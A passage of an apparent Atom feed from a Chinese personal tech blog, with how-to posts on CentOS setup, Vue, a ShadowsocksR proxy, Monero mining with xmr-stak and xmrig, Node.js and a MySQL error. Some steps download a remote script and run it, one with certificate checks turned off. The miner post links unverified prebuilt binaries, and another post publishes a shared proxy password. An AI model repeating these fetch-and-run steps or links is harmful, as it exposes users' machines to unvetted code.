class="line">#LANG=&quot;en_US.UTF-8&quot;</span><br><span class="line">LANG=&quot;zh_CN.UTF-8&quot;</span><br><span class="line">SYSFONT=&quot;latarcyrheb-sun16&quot;</span><br></pre></td></tr></table></figure><p><strong>内核升级</strong></p><p>a.查看什么系统</p><blockquote><p>cat /etc/redhat-release</p></blockquote><p>b.查看内核版本</p><blockquote><p>uname -r</p></blockquote><p>c.启用 ELRepo 仓库：</p><blockquote><p>rpm -Uvh <a href="http://www.elrepo.org/elrepo-release-7.0-3.el7.elrepo.noarch.rpm" target="_blank" rel="noopener">http://www.elrepo.org/elrepo-release-7.0-3.el7.elrepo.noarch.rpm</a></p></blockquote><p>d.查看可用内核包：</p><blockquote><p>yum –disablerepo=”*” –enablerepo=”elrepo-kernel” list available</p></blockquote><p>e.下载所需要的内核</p><blockquote><p>yum –enablerepo=elrepo-kernel install kernel-lt</p></blockquote><p>f.重启生效</p><blockquote><p>reboot</p></blockquote><p>最后附上一个Linux命令统计的网站,常用的命令在里面都能找得到</p><p><a href="https://wangchujiang.com/linux-command/" target="_blank" rel="noopener">https://wangchujiang.com/linux-command/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;基本命令&quot;&gt;&lt;a href=&quot;#基本命令&quot; class=&quot;headerlink&quot; title=&quot;基本命令&quot;&gt;&lt;/a&gt;基本命令&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;①Centos 测速&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;wget &lt;a href=&quot;http://yun.name168.cn/speed.py&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://yun.name168.cn/speed.py&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;python speed.py&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;②文件拖拽&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;yum install -y lrzsz&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;③安装java&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://www.5658.pw/categories/Linux/"/>
    
    
      <category term="linux" scheme="https://www.5658.pw/tags/linux/"/>
    
      <category term="防火墙" scheme="https://www.5658.pw/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"/>
    
      <category term="centos 7" scheme="https://www.5658.pw/tags/centos-7/"/>
    
  </entry>
  
  <entry>
    <title>win10安装vue开发环境</title>
    <link href="https://www.5658.pw/2018/11/21/win10%E5%AE%89%E8%A3%85vue%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/"/>
    <id>https://www.5658.pw/2018/11/21/win10安装vue开发环境/</id>
    <published>2018-11-21T02:13:16.000Z</published>
    <updated>2018-12-10T13:40:53.860Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h4 id="引语"><a href="#引语" class="headerlink" title="引语"></a>引语</h4><p>看到有小伙伴给我留言说怎么不更新了，额…….  最近一直忙于做其他项目实在是没时间更新博客啊</p><p>最近在开发在一个小商城项目的时候遇到了一些关于Vue的问题 解决问题 解决了一天。先来讲讲这个小程序项目吧。</p><p>我是在这个微信商城小程序项目二次开发(基本的框架还是别人搭的)，前后端分离的项目。用到的技术<br><a id="more"></a></p><ul><li>核心框架：Spring Boot 2.0</li><li>安全框架：Apache Shiro 1.4</li><li>视图框架：Jfinal Enjoy</li><li>持久层框架：Jfinal ORM</li><li>定时器：Quartz 2.3</li><li>数据库连接池：Druid 1.0</li><li>日志管理：logback</li><li>页面交互：Vue2.x </li></ul><h4 id="先来张它那漂亮的照片吧"><a href="#先来张它那漂亮的照片吧" class="headerlink" title="先来张它那漂亮的照片吧"></a>先来张它那漂亮的照片吧</h4><p><img src="http://yun.name168.cn/Small_1.png" alt="&quot;微信小程序&quot;"></p><p><img src="http://yun.name168.cn/Small_2.png" alt="&quot;微信小程序&quot;"></p><p><img src="http://yun.name168.cn/Small_3.png" alt="&quot;微信小程序&quot;"></p><p>咳咳跑题了  好了 继续解决Vue</p><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><ul><li><p>win10 64位 专业版</p></li><li><p>Node 8.12.0</p></li><li>npm 6.4.1</li><li>cnpm 用的淘宝镜像  一键安装 npm install -g cnpm –registry=<a href="https://registry.npm.taobao.org" target="_blank" rel="noopener">https://registry.npm.taobao.org</a></li><li>Vue 2.9.6</li></ul><p>安装</p><ul><li><p>Node.js安装 去官网<a href="https://nodejs.org/en/" target="_blank" rel="noopener">https://nodejs.org/en/</a> 直接下载完后安装 配置一下环境变量 node -v是查看版本的</p></li><li><p>安装全局vue-cil     全局-g</p><blockquote><p>npm install vue-cli -g</p></blockquote></li></ul><p>PS：注意配置环境变量哦</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>使用cmd 例如我想在桌面创建一个vue项目就cd C:\Users\Daizouyang\Desktop\Vue 输入下面命令   mydemo是项目名称</p><blockquote><p>vue init webpack mydemo</p></blockquote><p>安装</p><blockquote><p>npm install</p></blockquote><p>编译</p><blockquote><p>npm run build</p></blockquote><p>运行</p><blockquote><p>npm run dev</p></blockquote><p>下次再运行的时候，只需进入项目，再npm run dev即可</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;引语&quot;&gt;&lt;a href=&quot;#引语&quot; class=&quot;headerlink&quot; title=&quot;引语&quot;&gt;&lt;/a&gt;引语&lt;/h4&gt;&lt;p&gt;看到有小伙伴给我留言说怎么不更新了，额…….  最近一直忙于做其他项目实在是没时间更新博客啊&lt;/p&gt;
&lt;p&gt;最近在开发在一个小商城项目的时候遇到了一些关于Vue的问题 解决问题 解决了一天。先来讲讲这个小程序项目吧。&lt;/p&gt;
&lt;p&gt;我是在这个微信商城小程序项目二次开发(基本的框架还是别人搭的)，前后端分离的项目。用到的技术&lt;br&gt;
    
    </summary>
    
      <category term="vue" scheme="https://www.5658.pw/categories/vue/"/>
    
    
      <category term="开发" scheme="https://www.5658.pw/tags/%E5%BC%80%E5%8F%91/"/>
    
      <category term="js" scheme="https://www.5658.pw/tags/js/"/>
    
      <category term="集群" scheme="https://www.5658.pw/tags/%E9%9B%86%E7%BE%A4/"/>
    
      <category term="分布式" scheme="https://www.5658.pw/tags/%E5%88%86%E5%B8%83%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>CentOS7.5搭建 ssr vpn用于翻墙</title>
    <link href="https://www.5658.pw/2018/11/01/CentOS7-5%E6%90%AD%E5%BB%BA-ssr-vpn%E7%94%A8%E4%BA%8E%E7%BF%BB%E5%A2%99/"/>
    <id>https://www.5658.pw/2018/11/01/CentOS7-5搭建-ssr-vpn用于翻墙/</id>
    <published>2018-11-01T06:36:22.000Z</published>
    <updated>2018-12-26T11:04:15.496Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>有人说我们看到的网络只是冰山一角,so我打算去’暗网‘这座冰山里看一下</p><p>迫于无奈国内访问无法访问，就连好用的Googel都上不去。</p><p>PS:请勿将此用于违法犯罪之技,一切后果自己承担。</p><a id="more"></a><h3 id="环境-配置"><a href="#环境-配置" class="headerlink" title="环境+配置"></a>环境+配置</h3><ul><li>CentOS 7.5 64位</li><li>1H 512M 20G SSD 100M带宽</li></ul><p>工具:Xshell</p><h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>一键编译安装</p><ul><li><p>wget -N –no-check-certificate <a href="https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/ssr.sh" target="_blank" rel="noopener">https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/ssr.sh</a> &amp;&amp; chmod +x ssr.sh &amp;&amp; bash ssr.sh</p></li><li><p>输入1开始安装 如果已安装请跳过此步骤</p></li><li><p>端口:8080</p></li><li><p>密码:ouyang</p></li><li><p>加密方式:1 -none</p></li><li><p>协议插件:1 -origin</p></li><li><p>混淆插件:5 -tls1.2_ticket_auth</p></li><li><p>选择Y进行安装</p></li><li><p>设备数量   端口限速 这三个直接回车</p></li><li><p>出现配置信息即完成</p></li></ul><p><img src="http://yun.name168.cn/ssr_information.png" alt="&quot;ssr搭建ssr&quot;"></p><h6 id="教程视频"><a href="#教程视频" class="headerlink" title="教程视频"></a>教程视频</h6><p><img src="http://yun.name168.cn/ssr_Course.gif" alt="&quot;centos搭建vpn&quot;"></p><p>PS:以上都可以自定义、按自己的需求配置即可，大牛勿喷。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>打开ShadowsocksR-dotnet4.0进行连接 没有这个工具的小伙伴可以到<a href="http://freeshadow.net/#" target="_blank" rel="noopener">http://freeshadow.net/#</a>去下载 </p><p><img src="http://yun.name168.cn/ShadowsocksR.png" alt="&quot;vpn搭建教程&quot;"></p><p>打开浏览器 打开Google官网 看下能否打开</p><p><img src="http://yun.name168.cn/ssr_google.png" alt="&quot;vpn一键搭建&quot;"></p><p>输入ip/打开<a href="https://whoer.net/zh" target="_blank" rel="noopener">https://whoer.net/zh</a>看下自己的ip是否与自己的ip一致</p><p><img src="http://yun.name168.cn/ssr_ip.png" alt="&quot;ssr查看ip&quot;"></p><p>可以看到我这边已经成功了  </p><p>最后送给大家一个美国的节点  可免校园网哦  有效期免费一年  </p><p>服务器地址：racernet-vip-us4.racernet-node.space<br>服务器端口：115<br>加密方式：aes-256-cfb<br>密码：F0uyIC<br>协议：auth_aes128_sha1<br>协议参数：995:GRgfAv<br>混淆：http_simple<br>混淆参数：HK2SCH1300cd432995.wns.windows.com</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;有人说我们看到的网络只是冰山一角,so我打算去’暗网‘这座冰山里看一下&lt;/p&gt;
&lt;p&gt;迫于无奈国内访问无法访问，就连好用的Googel都上不去。&lt;/p&gt;
&lt;p&gt;PS:请勿将此用于违法犯罪之技,一切后果自己承担。&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://www.5658.pw/categories/Linux/"/>
    
    
      <category term="SSR" scheme="https://www.5658.pw/tags/SSR/"/>
    
      <category term="VPN" scheme="https://www.5658.pw/tags/VPN/"/>
    
      <category term="跳板" scheme="https://www.5658.pw/tags/%E8%B7%B3%E6%9D%BF/"/>
    
      <category term="翻墙" scheme="https://www.5658.pw/tags/%E7%BF%BB%E5%A2%99/"/>
    
      <category term="加速" scheme="https://www.5658.pw/tags/%E5%8A%A0%E9%80%9F/"/>
    
      <category term="匿名" scheme="https://www.5658.pw/tags/%E5%8C%BF%E5%90%8D/"/>
    
  </entry>
  
  <entry>
    <title>Centos 挖矿</title>
    <link href="https://www.5658.pw/2018/10/25/Centos-%E6%8C%96%E7%9F%BF/"/>
    <id>https://www.5658.pw/2018/10/25/Centos-挖矿/</id>
    <published>2018-10-25T12:07:41.000Z</published>
    <updated>2018-12-10T13:40:45.417Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>上次给大家写了一个Windows的xmrig的编译教程,然后就有小伙伴问我Linux服务器能不能挖矿</p><p>因为很久没有关注挖矿了,So….. 技术有点退后….咳咳 该学习了呀。</p><a id="more"></a><h4 id="安装依赖环境"><a href="#安装依赖环境" class="headerlink" title="安装依赖环境"></a>安装依赖环境</h4><ul><li><p>yum install centos-release-scl epel-release -y</p></li><li><p>yum install cmake3 devtoolset-4-gcc* hwloc-devel libmicrohttpd-devel openssl-devel make git -y</p></li><li><p>scl enable devtoolset-4 bash</p></li></ul><h4 id="下载挖矿源码"><a href="#下载挖矿源码" class="headerlink" title="下载挖矿源码"></a>下载挖矿源码</h4><blockquote><p>git clone <a href="https://github.com/fireice-uk/xmr-stak.git" target="_blank" rel="noopener">https://github.com/fireice-uk/xmr-stak.git</a></p></blockquote><p>PS:注意,从github上克隆完成后,要修改一下默认的作者抽费率的设置</p><p>否则默认的作者要从你挖的结果中抽掉2%,修改文件xmr-stak/xmrstak/donate-level.hpp</p><p>中默认的2.0改为0.0  在这里修改哦constexpr double fDevDonationLevel = 0.0 / 100.0</p><h4 id="配置与编译"><a href="#配置与编译" class="headerlink" title="配置与编译"></a>配置与编译</h4><ul><li>cd xmr-stak/</li><li>cmake3 . -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF</li><li>make install</li></ul><h4 id="开始挖矿吧"><a href="#开始挖矿吧" class="headerlink" title="开始挖矿吧"></a>开始挖矿吧</h4><ul><li>cd bin/</li><li>./xmr-stak</li></ul><p>输入0</p><p>因为这里是2.5.1版本的 作者挖的是门罗 所以选择<strong><em>monero</em></strong> 之前的版本是<del>monero7</del> 根据实际情况选择</p><p><img src="http://yun.name168.cn/currency.png" alt="&quot;选择币种&quot;"></p><p>输入你挖的矿池pool.minexmr.com</p><p>输入钱包 <strong><strong><strong><strong><strong><strong><strong><strong><em>**</em></strong></strong></strong></strong></strong></strong></strong></strong></p><p>接着x或者起个名字</p><p>直接回车</p><p>接着输入n   n   n 你也可以根绝自己的需求更改</p><p><img src="http://yun.name168.cn/linux_mining_xmr-stak.png" alt="&quot;linux开始挖矿&quot;"></p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;上次给大家写了一个Windows的xmrig的编译教程,然后就有小伙伴问我Linux服务器能不能挖矿&lt;/p&gt;
&lt;p&gt;因为很久没有关注挖矿了,So….. 技术有点退后….咳咳 该学习了呀。&lt;/p&gt;
    
    </summary>
    
      <category term="挖矿" scheme="https://www.5658.pw/categories/%E6%8C%96%E7%9F%BF/"/>
    
    
      <category term="Linux" scheme="https://www.5658.pw/tags/Linux/"/>
    
      <category term="挖矿" scheme="https://www.5658.pw/tags/%E6%8C%96%E7%9F%BF/"/>
    
      <category term="算法" scheme="https://www.5658.pw/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="xmr-stak" scheme="https://www.5658.pw/tags/xmr-stak/"/>
    
      <category term="门罗币" scheme="https://www.5658.pw/tags/%E9%97%A8%E7%BD%97%E5%B8%81/"/>
    
  </entry>
  
  <entry>
    <title>Centos安装nodejs</title>
    <link href="https://www.5658.pw/2018/10/25/Centos%E5%AE%89%E8%A3%85nodejs/"/>
    <id>https://www.5658.pw/2018/10/25/Centos安装nodejs/</id>
    <published>2018-10-25T11:52:43.000Z</published>
    <updated>2018-12-10T13:37:27.214Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>Centos 7.5 64</p><a id="more"></a><h3 id="安装命令"><a href="#安装命令" class="headerlink" title="安装命令"></a>安装命令</h3><p>1.安装Nodejs</p><p>sudo yum install epel-release</p><p>sudo yum install nodejs</p><p>安装完成输入 node -v 查看版本 如果出现版本号 说明已经安装成功了</p><p><img src="http://yun.name168.cn/nodejs.png" alt="&quot;nodejs安装成功&quot;"></p><p>2.安装npm</p><p> sudo yum install npm –enablerepo=epel</p><p> sudo npm install -g express</p><p> sudo npm install -g express-generator</p><p>同上npm -v 查看npm版本号</p><p><img src="http://yun.name168.cn/npm.png" alt="&quot;npm安装成功&quot;"></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h3&gt;&lt;p&gt;Centos 7.5 64&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://www.5658.pw/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://www.5658.pw/tags/Linux/"/>
    
      <category term="工具" scheme="https://www.5658.pw/tags/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="方法" scheme="https://www.5658.pw/tags/%E6%96%B9%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>MySql导入SQL错误</title>
    <link href="https://www.5658.pw/2018/10/15/MySql%E5%AF%BC%E5%85%A5SQL%E9%94%99%E8%AF%AF/"/>
    <id>https://www.5658.pw/2018/10/15/MySql导入SQL错误/</id>
    <published>2018-10-14T23:50:28.000Z</published>
    <updated>2018-12-10T13:40:52.622Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近帮别人搭建一些棋牌站与SSC站,自己平时没事也喜欢搭建一些棋牌、论坛、博客、SSC等一些带有娱乐性的商业站。自己的空间到期了,懒得续了买了用处也不大。</p><a id="more"></a><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>搭建38彩的时候,导入SQL文件的时候碰见如下错误</p><blockquote><p>Access denied; you need (at least one of) the SUPER privilege(s) for this operation </p></blockquote><p>其实在本地测试的时候用这个DEFINER=<code>root</code>@<code>localhost</code>还没报错</p><p><img src="http://yun.name168.cn/sql_error.png" alt="&quot;SQL报错&quot;"></p><p>解决很简单把sql语句中的 DEFINER=<code>root</code>@<code>localhost</code>去掉就可以了</p><h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>不仅是在搭建的时候,在平常写代码的时候报了错,首先看控制台报错代码在哪一行</p><p>其次看报错提示,一般用IDEA都会提示的像博主我用Edit的就没那么幸运了。看下报错</p><p>的语句,一般都是英文 英语不好的同学可以去百度翻译下什么意思比如开头的错可翻译为</p><blockquote><p>访问被拒绝；您需要（至少一个）此操作的超级特权</p></blockquote><p>首先<code>访问被拒</code>应该想到权限问题。如果自己没遇到类似的问题可以去百度查这个错误代码的原因。</p><p>不要一报错就去跑去问老师、领导,这样不仅暴露了你敲代码的经验与习惯,更能看出你这个人做事的态度。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;最近帮别人搭建一些棋牌站与SSC站,自己平时没事也喜欢搭建一些棋牌、论坛、博客、SSC等一些带有娱乐性的商业站。自己的空间到期了,懒得续了买了用处也不大。&lt;/p&gt;
    
    </summary>
    
      <category term="数据库" scheme="https://www.5658.pw/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
      <category term="搭建" scheme="https://www.5658.pw/tags/%E6%90%AD%E5%BB%BA/"/>
    
      <category term="MySql" scheme="https://www.5658.pw/tags/MySql/"/>
    
  </entry>
  
  <entry>
    <title>win10 xmrig 挖矿 编译</title>
    <link href="https://www.5658.pw/2018/10/12/win10-xmrig-%E6%8C%96%E7%9F%BF-%E7%BC%96%E8%AF%91/"/>
    <id>https://www.5658.pw/2018/10/12/win10-xmrig-挖矿-编译/</id>
    <published>2018-10-12T04:59:08.000Z</published>
    <updated>2018-12-10T13:40:53.475Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>近两年以来,区块链的流行与火热,挖矿成了众人眼中发家致富的“财宝”了。当然博主也不会落后于网络啊。<br>博主今年3、4月份左右看上“门罗币”了,因为没多余的显卡去挖莱特币、<br>加上门罗币只需要CPU就可以挖了(也可以用CPU+GPU)。之前用的2.6.3版本的,最近接到框池的通知需要更新XMRig2.8版本以上 so….</p><a id="more"></a><p><img src="http://yun.name168.cn/xmrig-url.png" alt="&quot;矿池&quot;"></p><p>废话不多说教大家编译官方的xmrig挖矿工具。</p><p>PS:官方有编译好的二进制版本 直接可以用 当然抽水是少不了的。</p><h3 id="编译前准备"><a href="#编译前准备" class="headerlink" title="编译前准备"></a>编译前准备</h3><ul><li>系统: win10 x64</li><li>.Net Framework4.6<br><a href="https://www.microsoft.com/en-us/download/details.aspx?id=48137" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=48137</a></li><li>VS 2017 community<br><a href="https://docs.microsoft.com/zh-cn/visualstudio/productinfo/installing-an-earlier-release-of-vs2017" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/visualstudio/productinfo/installing-an-earlier-release-of-vs2017</a></li><li>CMake for Win64<br><a href="https://cmake.org/download/" target="_blank" rel="noopener">https://cmake.org/download/</a></li><li>NVIDIA CUDA <a href="https://developer.nvidia.com/cuda-downloads" target="_blank" rel="noopener">https://developer.nvidia.com/cuda-downloads</a></li><li>AMD APP SDK 3.0</li><li>OpenSSL/Hwloc and Microhttpd依赖包 链接：<a href="https://pan.baidu.com/s/1G5w2TRBI_T9g5ezbxI0VJQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1G5w2TRBI_T9g5ezbxI0VJQ</a> 提取码：577s</li><li>xmr-stak源代码 链接：<a href="https://pan.baidu.com/s/1ckCix6A59CfcYlb4hgw0tQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1ckCix6A59CfcYlb4hgw0tQ</a> 提取码：54za</li></ul><p>博主自己编译好的,已去抽水</p><blockquote><p>链接：<a href="https://pan.baidu.com/s/1CwwrTnVzHn-akXxm6UZdxw" target="_blank" rel="noopener">https://pan.baidu.com/s/1CwwrTnVzHn-akXxm6UZdxw</a> 提取码：vapy</p></blockquote><h3 id="软件的安装"><a href="#软件的安装" class="headerlink" title="软件的安装"></a>软件的安装</h3><h4 id="Visual-Studio-2017-Community"><a href="#Visual-Studio-2017-Community" class="headerlink" title="Visual Studio 2017 Community"></a>Visual Studio 2017 Community</h4><p>在安装Visual Studio 2017 Community的时候，除了要使用15.4.5版本外，要选中左边的“使用C++的桌面开发”和右边的“用于桌面的 VC++ 2015.3 c140 工具集(x86，x64)”。<br><img src="http://yun.name168.cn/vstudio.png" alt="&quot;挖矿图&quot;"></p><h3 id="CMake-for-Win64"><a href="#CMake-for-Win64" class="headerlink" title="CMake for Win64"></a>CMake for Win64</h3><p>我使用的是CMake 3.13.0版本，在安装的时候注意选择“Add CMake to the system PATH for all users”。</p><p><img src="http://yun.name168.cn/xmr-stak-cmake.png" alt="&quot;挖矿图&quot;"></p><h3 id="CUDA和AMD-APP-SDK（可选）"><a href="#CUDA和AMD-APP-SDK（可选）" class="headerlink" title="CUDA和AMD APP SDK（可选）"></a>CUDA和AMD APP SDK（可选）</h3><p>在安装CUDA的时候，默认的自定义安装是全选的，如果你想最小化安装，请选择：</p><ul><li>CUDA/Develpment</li><li>CUDA/Visual Studio Integration (ignore the warning during the install that VS2017 is not supported)</li><li>CUDA/Runtime</li><li>Driver components</li></ul><p><img src="http://yun.name168.cn/xmr-stak-cuda.png" alt="&quot;挖矿图&quot;"></p><p>PS:如果挖矿的时候只用CPU，那么可以不用安装CUDA和AMD APP SDK。AMD APP SDK安装还是蛮简单的，官网的下载器经常会下载出错，在准备工作中有一个可以直接下载的链接</p><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>上面的基础工作准备好之后，编译还是很快的。</p><p>解压xmr-deps-3.3.zip，放到C盘根目录下，C:\xmrig-deps。解压xmrig的源代码，也放到C盘根目录下，C:\xmrig。</p><p>打开cmd对话框， cd c:\xmrig-deps ，进入xmrig-deps目录，运行 tree . 看看这个目录结构和下面是否一致。</p><p><img src="http://yun.name168.cn/xmrig-tree.png" alt="&quot;配置图&quot;"></p><p>如果内容和图片一样， cd c:\xmr-stak 进入xmr-stak目录，然后一条一条运行下面的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&quot;C:\Program Files (x86)\Microsoft Visual Studio\2017\Community\Common7\Tools\VsMSBuildCmd.bat&quot;</span><br><span class="line"></span><br><span class="line">set CMAKE_PREFIX_PATH=C:\xmrig-deps\hwloc;C:\xmrig-deps\libmicrohttpd;C:\xmrig-deps\openssl</span><br><span class="line"></span><br><span class="line">cd c:\xmrig</span><br><span class="line"></span><br><span class="line">mkdir build</span><br><span class="line"></span><br><span class="line">cd build</span><br><span class="line"></span><br><span class="line">cmake .. -G &quot;Visual Studio 15 2017 Win64&quot; -DXMRIG_DEPS=c:\xmrig-deps\msvc2017\x64</span><br><span class="line"></span><br><span class="line">cmake --build . --config Release --target install</span><br></pre></td></tr></table></figure><p>在编译的过程中，会出现“可能丢失数据”的警告，这个可以忽略，只要没有错误就行。<br><img src="http://yun.name168.cn/xmrig-start.png" alt="&quot;配置图&quot;"></p><p>如果不需要编译显卡挖矿，把</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmake .. -G &quot;Visual Studio 15 2017 Win64&quot; -DXMRIG_DEPS=c:\xmrig-deps\msvc2017\x64</span><br></pre></td></tr></table></figure><p>改成以下的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmake .. -G &quot;Visual Studio 15 2017 Win64&quot; -DXMRIG_DEPS=c:\xmrig-deps\msvc2017\x64 -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF</span><br></pre></td></tr></table></figure><p>-DCUDA_ENABLE=OFF表示不编译Nvidia显卡，-DOpenCL_ENABLE=OFF表示不编译AMD显卡。</p><p>编译完成后直接去C:\xmrig\build 就可以看到xmrig.sln文件了 双击打开使用Visual Studio编译为exe文件</p><p><img src="http://yun.name168.cn/xmrig-stu.png" alt="&quot;编译完成&quot;"></p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>新建一个txt文件粘贴一下命令</p><blockquote><p>xmrig.exe –donate-level 0 -o 矿池地址 -u 钱包地址 -px -k</p></blockquote><p><img src="http://yun.name168.cn/xmrig-bat.png" alt="&quot;开始挖矿&quot;"></p><p>PS:文章部分内容来自于网络学习如有侵权,请在下方留言通知博主删除。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;近两年以来,区块链的流行与火热,挖矿成了众人眼中发家致富的“财宝”了。当然博主也不会落后于网络啊。&lt;br&gt;博主今年3、4月份左右看上“门罗币”了,因为没多余的显卡去挖莱特币、&lt;br&gt;加上门罗币只需要CPU就可以挖了(也可以用CPU+GPU)。之前用的2.6.3版本的,最近接到框池的通知需要更新XMRig2.8版本以上 so….&lt;/p&gt;
    
    </summary>
    
      <category term="挖矿" scheme="https://www.5658.pw/categories/%E6%8C%96%E7%9F%BF/"/>
    
    
      <category term="挖矿" scheme="https://www.5658.pw/tags/%E6%8C%96%E7%9F%BF/"/>
    
      <category term="算法" scheme="https://www.5658.pw/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="区块链" scheme="https://www.5658.pw/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
</feed>
